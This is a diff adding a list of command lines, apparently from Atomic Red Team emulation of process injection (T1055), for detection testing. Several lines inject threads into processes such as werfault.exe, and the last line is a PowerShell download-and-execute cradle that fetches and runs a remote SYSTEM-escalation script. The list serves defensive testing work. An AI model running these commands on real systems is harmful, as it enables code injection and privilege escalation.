@@ -1,0 +1,11 @@
+"C:\AtomicRedTeam\atomics\T1055\bin\x64\CreateRemoteThread.exe" -pid 11728 -debug
+"C:\AtomicRedTeam\atomics\T1055\bin\x64\CreateRemoteThreadNative.exe" -pid 30004 -debug
+"C:\AtomicRedTeam\atomics\T1055\bin\x64\CreateThread.exe" -debug
+"C:\AtomicRedTeam\atomics\T1055\bin\x64\CreateThreadNative.exe" -debug
+"C:\AtomicRedTeam\atomics\T1055\bin\x64\RtlCreateUserThread.exe" -pid 1760 -debug
+"powershell.exe" & {$process = Start-Process C:\Windows\System32\werfault.exe -passthru C:\AtomicRedTeam\atomics\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug}
+"powershell.exe" & {$process = Start-Process C:\Windows\System32\werfault.exe -passthru C:\AtomicRedTeam\atomics\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug}
+"powershell.exe" & {$process = Start-Process C:\Windows\System32\werfault.exe -passthru C:\AtomicRedTeam\atomics\T1055\bin\x64\RtlCreateUserThread.exe -pid $process.Id -debug}
+"powershell.exe" & {C:\AtomicRedTeam\atomics\T1055\bin\x64\CreateThread.exe -debug}
+"powershell.exe" & {C:\AtomicRedTeam\atomics\T1055\bin\x64\CreateThreadNative.exe -debug}
+"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}
